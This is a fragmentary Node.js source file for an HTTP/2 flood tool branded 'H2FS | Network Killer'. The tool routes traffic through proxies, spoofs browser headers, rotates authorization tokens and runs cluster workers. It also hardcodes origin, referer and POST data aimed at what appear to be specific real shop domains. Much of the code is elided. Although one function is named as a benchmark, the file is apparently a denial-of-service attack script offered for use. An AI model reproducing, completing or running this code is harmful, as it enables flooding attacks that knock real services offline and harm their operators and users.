...
if (helpT) {
    console.clear();
    console.log("H2FS | Network Killer (PATCH: 1.6) | @ardflood\n".brightGreen);
    console.log(
        `(*) Required arguments:\n` +
...
const runBenchmark = async () => {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        http2.connect(urlT, {
            settings: {  // settings / settgs  ( idk how it works , but it wor ks) )00
            ...
            var browserVersion = randomIntn(119, 121);
            ...
            headers["accept"] = (methodT === "POST") ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";;
            ...
            headers["origin"] = "https://umb.sale";
            headers["referer"] = "https://umb.sale/";

            if (authT) { headers['Authorization'] = randomElement(readLines(authT)); }
            ...
            if ((parsed.host).includes("apishop.umbrella.day")) {
                ...
                postdata = {"data":{"section":"shop","type":"shipment","subtype":"get","shop":"f851d6b1a96a7c5b1e534fa236b0e88a"},"action":"shops"}
...
if (cluster.isMaster) {
    console.log("H2FS | Network Killer (PATCH: 1.6) | Last update:05.02.2024 | @ardflood".brightGreen);
